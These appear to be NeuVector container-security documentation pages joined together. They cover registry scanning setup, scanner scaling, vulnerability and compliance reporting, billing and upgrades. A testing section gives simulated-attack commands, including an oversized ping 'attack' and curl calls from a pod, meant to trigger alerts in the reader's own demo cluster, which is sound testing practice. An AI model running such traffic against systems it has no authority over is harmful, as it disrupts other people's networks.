GCP supports using a service account to access GCR. Here are the steps to enable a service account for GCR and use it to trigger repository scans from NeuVector.  Start in NeuVector, where one first sets up a new registry:    By selecting Google Container Registry as the repo type, this panel is customized to accept the input required to use your GCR.  Name - Here’s where you give this particular repo entry a name of your choosing. It’s merely to identify it in the NeuVector interface later on.Registry - This is the first place where you’ll want to be sure the correct data is collected from your GCR instance. While the example of https://gcr.io is the most common, we will want to be sure it accurately reflects how your GCR was set up in GCP. It might be https://us.gcr.io for example. We’ll go check it in the next section.JSON Key - As is pretty self-evident, this will be a JSON-formatted key. And, as you’re probably seeing a pattern set up for, we’ll be finding that via GCP.Filter - Be mindful that you will likely need to replace any filters here with the actual name of the repo. Again, that’s in the GCR interface.   Now let’s head on over to that GCR screen in GCP. Much of what we need is right here on this page.  A. See the “gcr.io” under Hostname? That’s what belongs in item #2, Registry in the NeuVector interface. (Don’t forget the https:// part) B. The ID of the repo is actually under the top level project. This is what you will be using in #3, Filter. See example of env-demo below.    The JSON Key leads us to explore another very important step, and that takes us to the IAM &amp; Admin section of GCP where we will create (or confirm the setting of) a Service Account. See below:    Once you enter the data for the first step of creating a service account, you need to press the “CREATE” button to get step 2 to be willing to accept input.    Be sure to select Basic —&gt; Viewer for the access. If you have an existing service account, ensure that the access is set this way. (Hint: Even access permissions that appear to be more powerful don’t seem to allow for proper access. Don't skip this step.  Once you’ve done this step, you can breeze past Step 3 and proceed with creating the Service Account.  If you don’t immediately land on the info panel for your new service account, be sure to go there on the Service Accounts list. See figure 5 below.    Click “ADD KEY” —&gt; “Create New Key”    As you have already concluded, JSON is the go-to here. Selecting “CREATE” will result in a file that you can download in your browser. The contents of this file should be pasted into the 3, JSON Key field in NeuVector; see figure 1.  Before you get too excited there’s one more thing to ensure. In order for the scanner in NeuVector to use the API to scan and protect your images, said API must be enabled in your GCP account. You can either enable it via the command line via  gcloud services enable artifactregistry.googleapis.com   Or you can use the GCP gui. Head to “API Library” and search for “Artifact Registry API” and ensure it is turned on for your project. See figure 7.    You should be set! See figure 8 below for a properly-configured registry using the data from our example:    Obtain the Access Token Using the REST API​  The NeuVector REST API may be used to authenticate using the service account.

If necessary, scanners can be placed on specific nodes or avoid placing multiple pods on one node using standard Kubernetes node labels, taints/tolerations, or node affinity configurations.

Please note that in initial releases the presence and status of multiple scanners is only visible in Kubernetes with 'kubectl get pods -n neuvector' and will not be displayed in the web console.  Scan results from all scanners are shown in the Assets -&gt; Registries menu. Additional scanner monitoring features will be added in future releases.  Auto-scaling of Scanner Pods​  Scanner pods can be configured to auto-scale based on certain criteria. This will ensure that scanning jobs are handled quickly and efficiently, especially if there are thousands of images to be scanned or re-scanned. There are three possible settings: delayed, immediate, and disabled. When images are queued for scanning by the controller, it keeps a 'task count' of the queue size.  Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet  Scanner auto-scaling is configured in Settings -&gt; Configuration. The minimumScannerPods setting sets the minimum scanner pods running at any time, while the maxScannerPods sets the maximum number of pods that the auto-scaling strategy can scale up to. NOTE: Setting a minimum value will not adjust the original scanner deployment replicaset value. The minimum value will be applied during the first scale up/down event.  important Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value.  Operations and Debugging​  Each scanner pod will query the registries to be scanned to pull down the complete list of available images and other data. Each scanner will then be assigned an image to pull and scan from the registry.  To inspect the scanner behavior, logs from each scanner pod can be examined using  kubectl logs &lt;scanner-pod-name&gt; -n neuvector   ","version":"5.3","tagName":"h3"},{"title":"Performance Planning​","type":1,"pageTitle":"Parallel & Standalone Scanners","url":"/scanning/scanners#performance-planning","content":" Experiment with varying numbers of scanners on registries with a large number of images to observe the scan completion time behavior in your environment. 2-5 scanners as the replica setting should be sufficient for most cases.  When a scan task is assigned to a scanner, it pulls the image from the registry (after querying the registry for the list of available images). The amount of time it takes to pull the image (download) typically consumes the most time. Multiple scanners can be pulling images from the same registry in parallel, so the performance may be limited by registry or network bandwidth.  Large images will take more time to pull as well as need to be expanded to scan them, consuming more memory. Make sure each scanner has enough memory allocated to it to handle more than the largest expected image (10% more minimum).  Multiple scanner pods can be deployed to the same host/node, but considerations should be made to ensure the host has enough memory, CPU, and network bandwidth for maximizing scanner performance.

Responses can include quarantine, webhook notification, and suppression.  Federated Registries for Distributed Image Scanning Results​  The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster.

Add or edit registries to be scanned. Use the Filter to define repositories or subsets of images to be scanned. If your registry requires access through a proxy, this can be configured in Settings -&gt; Configuration.    The registry will be scanned according to a schedule, which is configurable. By default, only new or updated images will be scanned. If you want to re-scan all applicable images whenever the CVE database is updated, select the Rescan After CVE DB Update button when configuring the registry. You can also select Layered Scan to show vulnerabilities by each layer in the image (note: layered scans can take longer and consume more resources to complete).  After the scan is completed you will see the results below it. Click on the repository/tag to see vulnerabilities and click on the vulnerability to see more info. You can also download the report in a CSV file or see the results in the Event logs.    The scan results include vulnerabilities by image layer, if this option was selected during registry/repository configuration, as well the compliance checks results. Click the compliance tab when viewing the scan results for the image to see compliance checks.  Scanning will also discover and list all Modules (ie, an inventory) in the image, as shown below. It will also summarize the vulnerability risk by module and list all vulnerabilities for each module.    Scanning is supported for images on public and private docker registries that are based on Native Docker, Amazon ECR, Redhat/Openshift, jFrog, Microsoft ACR, Sonatype Nexus, Harbor, Google cloud and other registries. The scan report for the image comprises of the vulnerability status of various packages and binaries in the image. The brief summary of the scan report can be sent via webhook using the Response rule configuration in Policy -&gt; Response Rules, or by Syslog by configuring a syslog server in Settings -&gt; Configuration. Results can also be viewed in the Event logs.  At least one repository filter is required (can't be left blank).  Repository filter examples​    Notes:  To scan all image tags, add filter as * or *:*. This works on all registry types except the public docker registry.Repository should be full name if organization is nil for public docker registry or add library before repository as given above.Create a virtual repository and add all local repository to it to scan all tags on a JFrog registry with the subdomain docker access method.Regular expressions can be used in a filter. For example alpine:3.[8|9].* will scan all 3.8.x and 3.9.x images and tags on docker hub.  Registry scan options​  Scan Layers: Provides vulnerability scan result for every image layer separatelyProvides information about commands executed, packages added in the layerImages size of each layer Auto Scan: Auto Scan is only supported with OpenShift imagestream integration. Proper role binding should be configured in advance.When Auto Scan is enabled, as soon as an image is pushed to the registry, the image scan will be scheduled. Periodical Scan: Enable periodic scan to scan periodicallyScan interval can set to be between 5 minutes to every 7 days.Because many Admission Control checks rely on image scan result, enabling periodical scan helps make sure Admission Control has the up-to-date information of the images.Note that NeuVector will scan images in a regsistry that are new/changed from the previous scan.

Best practices for managing vulnerabilities in NeuVector include:  Scan during the build-phase, failing the build if there are critical vulnerabilities 'with fix available.' This forces developers to address fixable vulnerabilities before storing in registries.Scan staging and production registries continuously to look for newly discovered vulnerabilities. Vulnerabilities with fixes available can be required to be fixed immediately, or a grace period allowed to provide time to remediate them.Configure Admission Control rules to block deployments into production based on criteria such as critical/high, fix available, and reported date.Continuously scan the production nodes/hosts, containers, and orchestration platform for vulnerabilities for newly discovered vulnerabilities. Implement responses based on criticality/severity that can be webhook alerts (that contact security and developer), quarantine container, or start a grace period for remediation.Ensure running containers are in Monitor or Protect mode with appropriate whitelist rules to 'virtually patch' vulnerabilities to prevent any exploit in production.Scan distroless and PhotonOS based images.  The Dashboard in NeuVector presents a summary risk score which includes vulnerabilities, which can be used to reduce risk from vulnerabilities. See how to improve the risk score for more details.  The other main tool for reviewing, filtering, and reporting on vulnerabilities is in the Security Risks menu.  Security Risks Menu - Vulnerabilities​  This menu combines the results from registry (image), node, and container vulnerability scans and compliance checks found in the Assets menu to enable end-to-end vulnerability management and reporting.  The Vulnerabilities menu provides a powerful explorer tool to:  Make it easy to filter for viewing or downloading of reports, by typing in a search string or using the advanced filter next to the box. The advanced filter allows users to filter vulnerabilities by fix available (or not available), urgency, workloads, service, container, nodes or namespace names.Understand the Impact of vulnerabilities and compliance checks by clicking on the impact row and reviewing remediation and impacted images, nodes, or containers.View the Protection Status (exploit risk) of any vulnerability or compliance issue to see if there are NeuVector Run-Time security protections (rules) enabled for impacted nodes or containers.'Accept' a vulnerability/CVE after it has been reviewed to hide it from views and suppress it from reports.    Use the filter box to enter a string match, or use the advanced filter next to it to select more specific criteria, as shown below. Downloaded PDF and CSV reports will show only the filtered results.    Selecting any CVE listed provides additional details about the CVE, remediation, and which images, nodes, or containers are Impacted. The Protection State icon (circle) shows various colors to indicate a rough percentage of the impacted items which are unprotected by NeuVector during run-time, protected by NeuVector rules (in a Monitor or Protect mode), or unaffected in run-time (e.g. an image scanned with this vulnerability has no running containers). The Protection State column color scheme is:  Black = unaffectedGreen = protected by NeuVector with Monitor or Protect modeRed = unprotected by NeuVector, still in Discover mode  The Impact analysis window (showing affected images, nodes, containers) color scheme is:  Black = unaffected. There are no containers using this image in productionPurple = running in Monitor mode in productionDark Green = running in Protect mode in productionLight Blue = running in Discover mode in production (unprotected)  The Impact colors are meant to correspond to the run-time protection colors for Discover, Monitor and Protect modes in other places in the NeuVector console.  Accepting Vulnerabilities​  You can 'Accept' a vulnerability (CVE) to exclude it from reports, views, risk scoring etc. A vulnerability can be selected and the Accept button clicked from several screens such as Security Risks -&gt; Vulnerabilities, Assets -&gt; Containers etc. Once accepted, it is added to the Security Risks -&gt; Vulnerability Profile list. It can be viewed, exported, and edited here. Note that this Accept feature can be limited to listed Images and/or Namespaces. New entries can also be added manually to this list from this screen.  To Accept a vulnerability globally, go to the Security Risks -&gt; Vulnerabilities page and select the vulnerability, then Accept. This will create a Vulnerability Profile for this CVE globally.    To Accept a vulnerability found in an image scan, open the image scan results in Assets -&gt; Registries, pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this image. NOTE: This action will create a Vulnerability Profile entry for this CVE in this IMAGE only.    To Accept a vulnerability found in a container in Assets -&gt; Containers, select the vulnerability and pull down the View dropdown and select Accept. Note that you can also choose to Show or Hide accepted vulnerabilities for this container. NOTE: This action will create a Vulnerability Profile for this CVE in this NAMESPACE only.    This action can also be performed in Assets -&gt; Nodes, which will create a Vulnerability Profile for the CVE for all containers, images and namespaces.  important Globally Accepted vulnerabilities are excluded from the view in Security Risks -&gt; Vulnerabilities and in exported reports from this page. Accepted vulnerabilities which are limited to specific images or namespaces will continue to show in the view, but be excluded for reports where the Advanced Filter limits the view to those images or namespaces.  Managing Vulnerability Profiles​  Each accepted vulnerability/CVE creates an entry in the Security Risks -&gt; Vulnerability Profile list. These entries can be edited to add or remove attributes such as image name(s) and namespace(s).    New accepted vulnerabilities can also be added here by entering the CVE name to be Accepted.

CIS Benchmarks automatically run by NeuVector include:  KubernetesDockerRed Hat OpenShift draft 'Inspired by CIS' benchmarksGoogle GKE  Compliance scan results can be seen for individual Assets in the Registries (for Images), Nodes, and Containers menus by selecting the relevant asset and clicking the Compliance tab.  The Security Risks -&gt; Compliance menu enables consolidated compliance reporting, similar to how the Vulnerabilities menu works.  Security Risks - Compliance and Compliance Profile​  Compliance results are show in the list by Category and Name. Categories include Docker, Kubernetes, OpenShift, and Custom. The names of each item correspond to the CIS benchmark. For example, K.4.2.3 corresponds to the Kubernetes CIS benchmark 4.2.3. Docker benchmarks are preceded with 'D' with the exception of Image related benchmarks, which are preceded by 'I'.  Use the Advanced filter to select compliance checks based on platform, host, namespace or industry standard, as shown below.    After applying the filter, only the relevant CIS benchmarks and custom checks will be shown, and a report can be generated and downloaded. This is how reports for standards such as PCI, HIPAA, GDPR and other standards can be generated.  The following screenshot shows an example of a secret found in an image scan.    Customizing Compliance Templates for PCI, GDPR, HIPAA, NIST and others​  The Compliance profile menu enables customization of the built-in templates for industry standards such as PCI and GDPR. These reports can be generated from the Security Risks -&gt; Compliance menu by selecting one of the standards to filter, then exporting. The NIST profile is for NIST SP 800-190.  To customize any compliance profile, select the industry standard (e.g. PCI), then enable or disable specific checks for that standard. Think of these as compliance 'tags' that are applied to each check in order to generate a compliance report for that industry standard.  Use the Action button to add or remove any compliance tag from that check.    In addition, you can select which 'Assets' are considered to be part of the compliance reports by clicking on the Assets tab. By default, all compliance templates are applied to Images, Nodes and Containers.    Use the Action button to add or remove compliance templates for assets.  Images. Select the standard(s) to be reported for Images.Nodes. Select the standard(s) to be reported for Nodes (hosts).Containers. Select the stadard(s) to be reported for Containers.  Alternatively, instead of restricting by the above criteria, compliance templates can be restricted to certain Namespaces. If this box is checked and namespace(s) added, reports will be generated for all assets which apply to these namespaces. This can be useful if, for example, the PCI template should only report on assets for namespaces which container PCI in-scope (applicable) workloads.    After the templates and assets are customized (if desired) in the Security Risks -&gt; Compliance Profiles menu, reports can be generated in the Security Risks -&gt; Compliance menu by opening the advanced filter and selecting the compliance template desired. For example, selecting GDPR will filter the display and reports for only the GDPR profile.  Secrets Auditing​  NeuVector checks for over 40 common types of secrets as part of the image compliance scans and run-time scans. In addition, custom compliance scripts can be configured for containers or hosts, and the DLP packet inspection feature can be used to check for secrets in network payloads.  The results for secrets auditing can be found in the Compliance section of image scans (Assets -&gt; Registries), containers (Assets -&gt; Containers), nodes (Assets -&gt; Nodes), and the compliance management menu (Security Risks -&gt; Compliance).  The following is an example of how secrets detected in an image scan will be displayed.    Here is a list of the types of secrets being detected.

The scanner image is updated on the NeuVector Docker Hub registry with the latest CVE database frequently, as often as daily if there are updates. To update the CVE database used in scanning, simply pull and deploy the latest Scanner image. The latest database version number can be found listed here.  A container called the Updater performs the task of restarting the scanner pods in order to force a pull of the latest image, which will update the CVE database. To automatically check for updates and update the scanner, an updater cron job can be created.  By default, the updater cron job shown below is automatically started from the sample deployment yaml files for Kubernetes and OpenShift. This will automatically check for new CVE database updates through new scanner versions published on the NeuVector Docker hub registry. Manual updates on docker native deployments are shown below. For OpenShift deployments or others where images have to be manually pulled from NeuVector, the scanner with the 'latest' tag should be pulled from NeuVector to update the CVE database.  For registry scanning, if the box 'Rescan after CVE DB update' is enabled, all images in that registry will be rescanned after a CVE database update. For run-time scanning, all running assets will be rescanned after a CVE database update if the Auto-Scan feature is enabled.  Updater Cron Job​  This cron job is deployed by NeuVector automatically as part of the sample deployment, so is typically not required to start manually.  The Updater is a container image which, when run, restarts the scanner deployment, forcing the pull of the latest Scanner image. The updater re-deploys all scanner pods by taking the deployment to zero and scaling it back up.  The cron job sample neuvector-updater.yaml below for Kubernetes 1.8 and later runs the updater every day at midnight. The schedule can be adjusted as desired.

NeuVector can also be deployed manually using the standard documentation and repositories. When ready to add support to your NeuVector deployment and have this billed via the cloud marketplace, follow the available documentation.  How does SUSE calculate the ‘average number of nodes’ to bill for?  The average node count is calculated by adding the number of active nodes (counted hourly) and dividing by the number of hours NeuVector has been active in the billing cycle.  Below are 3 examples of how the average node count is calculated.  note The example uses 730 hours for the billing cycle. Actual billing would depend on the number of days in the month and the resulting billing cycle.  Table 2.

Bursting Model: Using NeuVector on 10 nodes for 3 weeks (562 hours) in the month, bursting to 30 nodes for 1 week (168 hours). Transient cluster: A temporary deployment of NeuVector on 20 nodes for 2 weeks (336 hours).  Are special commercial terms available?  Depending on the deployment, it may be possible to secure special commercial terms. e.g. An annual subscription would be handled via an AWS private offer. Please contact SUSE for more information.  Can my spend on NeuVector Prime count towards my cloud discount program such as AWS EDP or Azure’s MACC?  For AWS, the spend can count towards your EDP. Please contact your AWS Sales Team for more details. For Azure, the spend can count towards your MACC. Please contact your Microsoft Azure Sales Team for more details.  How do I purchase NeuVector Prime for additional nodes?  Once NeuVector has been deployed from the listing on the cloud marketplace and billing is active, there is no need to make a specific purchase for additional nodes. Billing is dynamic and based on the number of nodes where NeuVector is deployed. Just add NeuVector to additional nodes in federated clusters as needed.  Is this an annual commitment, will it auto-renew?  By default, the NeuVector Prime listing in the cloud provider marketplace is billed on a monthly cycle, based on usage. Billing is on-going for as long as NeuVector is deployed.  Depending on the deployment, custom monthly pricing may be available. This applies to AWS and Azure deployments.  ","version":"5.3","tagName":"h2"},{"title":"Technical (Billing)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#technical-billing","content":" Do I need a managed Kubernetes cluster running in my cloud provide to install NeuVector Prime and be billed via the marketplace?  Yes. For AWS, to benefit from monthly billing via the AWS Marketplace, the primary cluster must be an EKS Cluster running in your AWS Account. For Azure, to benefit from monthly billing via the Azure Marketplace, the primary cluster must be an AKS Cluster running in your Azure Account.  On which Kubernetes distributions can the NeuVector Prime Cloud Marketplace listing be deployed?  For AWS, the NeuVector Prime AWS Marketplace listing must be deployed on an Amazon EKS. For Azure, the NeuVector Prime Azure Marketplace listing must be deployed on AKS via the marketplace offering.  info Downstream clusters can run any Supported Kubernetes platform, such as RKE, RKE2, K3s, AKS, EKS, GKE, vanilla Kubernetes, OpenShift, Mirantis Kubernetes Engine, and so on. Please see Supported Platforms.  What is the deployment mechanism?  For AWS, the Marketplace listing for NeuVector Prime is deployed using Helm. For Azure, the NeuVector Prime Azure Marketplace listing is deployed using the Azure Portal (and the deployment is CNAB based).  What is the easiest way to get started?  The way to get started is to add the cloud marketplace listing for NeuVector Prime to a managed cubernetes cluster, such as as EKS or AKS. Follow the instructions in the usage section, a Helm chart in AWS and the Azure Portal for Azure, takes care of the application installation and setting up billing.  What version of NeuVector is installed when using the marketplace listing?  The marketplace listing for NeuVector Prime is tied to a specific version of NeuVector, typically the latest version available at the time of the listing update. Please check the listing for further information.  I need a prior version of NeuVector installed, can I still use the listing?  No. There is no choice of NeuVector version when deploying using the marketplace listing. If a prior version of NeuVector is required, must be installed manually using the standard documentation.  How often is the listing updated (including the version of NeuVector)?  The marketplace listing is tied to a specific version of NeuVector, usually the latest version available at the time the listing was last updated.  Typically, the marketplace listing is updated quarterly, or more frequently if there are security issues. NeuVector itself is updated with major, minor, or patch versions every 6-8 weeks.  To update the NeuVector product to a current version before the marketplace listing is updated, please see Updating NeuVector.  I have many Kubernetes clusters across multiple cloud accounts, does the NeuVector billing still work and enable tiered pricing?  Yes. Downstream (federated) clusters running NeuVector can be deployed across single or multiple cloud accounts, on-premises or even across diffferent public clouds. Downstream nodes report up to the primary NeuVector deployment. This process is called federation and is needed to enable tiered pricing for your NeuVector deployments.  Billing is routed to the cloud provider account in which the primary cluster is running.  I have multiple independent clusters, each running a separate installation of the NeuVector Prime marketplace listing, how is this billed?  As the NeuVector deployments are independent, each cluster is billed separately from the others. It is not possible to benefit from tiered pricing across clusters unless the NeuVector deployments are federated. Federation requires that only the primary cluster (not downstream remotes) be installed with the NeuVector Prime marketplace listing. Learn more about federation in Enterprise Multi-Cluster Management.  If Federation is not possible, consider custom terms from SUSE.  How can I federate NeuVector to benefit from tiered pricing across all deployments?  The primary cluster must be running on a managed kubernetes cluster. This is EKS in the AWS Cloud, or AKS in Azure. The cluster must be running the NeuVector Prime marketplace listing.  attention There MUST be network connectivity between the controllers in each cluster on the required ports. The controller is exposed externally to its cluster by either a primary or remote service. See Enterprise Multi-Cluster Management for more information on federating clusters.  I have purchased multiple SUSE products from the public cloud marketplace (e.g., Rancher Prime and NeuVector Prime), does the marketplace billing method still work?  Yes. The billing mechanisms for the two deployments are independent and will be billed separately via the marketplace.  I already have an existing cluster in place and want to add NeuVector Prime and have this billed via the marketplace. Is this possible?  Yes, providing it is an EKS cluster in AWS, or AKS in Azure. Simply deploy the AWS Marketplace listing for NeuVector Prime to your EKS or AKS cluster.  I already have an existing cluster with NeuVector deployed, can I just install the NeuVector Prime marketplace listing and have support billed via the cloud marketplace?  Yes. This is possible by redeploying the NeuVector Prime from the cloud provider marketplace listing. Please follow the documentation to back up the existing NeuVector configuration, as it may be necessary to restore the configuration into the new deployment.  ","version":"5.3","tagName":"h2"},{"title":"Technical (Product)​","type":1,"pageTitle":"Public Cloud Marketplaces","url":"/special/public-cloud#technical-product","content":" How do I get support?  It is very simple to open a support case with SUSE for NeuVector. Create a ‘supportconfig’ via the NewVector UI and upload the output to the SUSE Customer Center. The support config bundle can be exported from the NeuVector console under Settings &gt; Configuration.  tip For multi-cluster (federated) deployments, export the supportconfig bundle from the primary cluster only. The NeuVector Prime billing mechanism must be active on the primary cluster to open a support case.  Is there any difference between the NeuVector Prime product on the cloud marketplace compared to the versions I can run in my own data center or install manually in the cloud?  The NeuVector Prime product in the cloud marketplace is the same product with the same functionality as what you would install manually in the cloud or run on-premises. The only difference is the billing route.  Does the primary cluster (responsible for billing) need to run 24/7?  To ensure continuity with support, it is recommended that the primary NeuVector Prime cluster always remains active.  What if the primary cluster responsible for billing is unable to connect to the cloud provider billing framework?  There may be multiple reasons why the primary cluster is unable to connect to the billing framework, but it is the customer’s responsibility to ensure that the primary cluster is active and connected. While the cluster is not connected to the billing framework, it is not possible to raise a support request.  My primary cluster has been offline, what happens with billing when it reconnects?  If the primary cluster is offline or disconnected from the cloud provider billing framework for a period of time, when it reconnects, the stored usage data will be uploaded and will appear on your next marketplace bill.  note Depending on when in the month the primary cluster gets reconnected you may have several months of usage on your next billing cycle.  How do I get fixes and updates to NeuVector?  NeuVector is updated with major, minor, or patch versions every 6-8 weeks.

Generating Network Violations on Kubernetes​  To generate a violation from a nodejs pod, find a pod:  kubectl get pod -n demo   Then try some violations (replace node-pod-name):  kubectl exec node-pod-name curl www.google.com -n demo   Or find the internal IP address of another node pod, like 172.30.2.21 in the example below, to connect from one node to another:  kubectl exec node-pod-name curl 172.30.2.21:8888 -n demo   Generate a Threat/Attack​  To simulate an attack, log into a container, then try a ping attack:  kubectl exec -it node-pod-name bash -n demo   Use the internal IP of another node pod:  ping 172.30.2.21 -s 40000   For all of the above, you can view the security events in the NeuVector console Network Activity map, as well as the Notifications tab.  Process and File Protection Tests​  Try various process and file activity by exec'ing into a container and running commands such as apt-get update, ssh, scp or others. Any process activity or file access not allowed will generate alerts in Notifications.  Registry Scanning and Admission Control​  A popular test is to configure image scanning of a registry in Assets -&gt; Registries. After the scan is complete, configure an Admission Control rule in Policy. Be sure to enable Admission Controls and set a rule to Deny when there are high vulnerabilities in an image. Then pick an image that has high vulnerabilities and try to deploy it in Kubernetes. The deployment will be blocked in Protect mode and you will see an event in Notifications -&gt; Security Risks.  More advanced admission control testing can be done using different criteria in rules, or combining criteria.  Deploy Another App​  The Kubernetes Guestbook demo application can also be deployed on Kubernetes. It is recommended to deploy it into its own namespace so you can see namespace based filtering in the NeuVector console.

Initial Deployment​  Check that the NeuVector containers can be pulled with correct authentication. Check the secret used and make sure the cluster is able to access the appropriate registry.Make sure the changes to the yaml required (e.g. NodePort or LoadBalancer) or Helm values settings are set appropriately.Check the platform and container run-time and make changes as needed (e.g. PKS, containerd, CRI-O).

NeuVector supports specific configurations for LDAP/AD and other integrations for groups and roles. Contact NeuVector for additional troubleshooting steps and a tool for AD troubleshooting.Registry scanning. Most issues are related to registry authentication errors or inability for the controller to access the registry from the cluster.For performance issues, make sure the scanner is allocated enough memory for scanning large images.

Make sure you map the volume to your guest machine directory or local system directory to be able to access the files. For example in the docker-compose file add ‘- /var/neuvector:/var/neuvector’ in volumes.  To start packet capture on a pod, you will need to know the containerID to pass into the ID_OR_NAME field. You can do this with show container -c &lt;container_name&gt;. then start the sniffer with request sniffer start &lt;container_id&gt;.

If there is a new release available, pull it from Docker Hub. It is recommended to use a ‘rolling update’ strategy to keep at least one Allinone or Controller container running at any time during an update.  imporant Host OS updates, reboots, and orchestrator updates can cause pods to be evicted or stopped. If a Controller is affected, and there are no other Controllers active to maintain the state, the Controllers can become available for some time while new controllers are started, a cluster is formed with a leader, and the persistent storage backup of the configuration is attempted to be accessed to restore the cluster. Be careful when scheduling host or orchestrator updates and reboots which may affect the number of controllers available at any time. See the Pod Disruption Budget below for possible ways to mitigate this. If deployment was done using the NeuVector Helm charts, updating will take care of additional services, rolebindings or other upgrade requirements. If updates are done manually or there is only one Allinone or Controller running, please note that current network connection data is NOT stored and will be lost when the NeuVector container is stopped. NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  To manually update NeuVector using docker-compose:  sudo docker-compose -f &lt;filename&gt; down   Note that if no filename is specified then the docker-compose.yml file is used.  Make sure the docker-compose.yml or other appropriate file is edited with the desired image version, if necessary, then:  $sudo docker-compose -f &lt;filename&gt; up -d   note We recommend that all NeuVector components be updated to the most recent version at the same time. Backward compatibility is supported for at least one minor version back. Although most older versions will be backward compatible, there may be exceptions which cause unexpected behavior.

The most important will be to ensure that there is at least one Allinone/Controller running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 30 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.
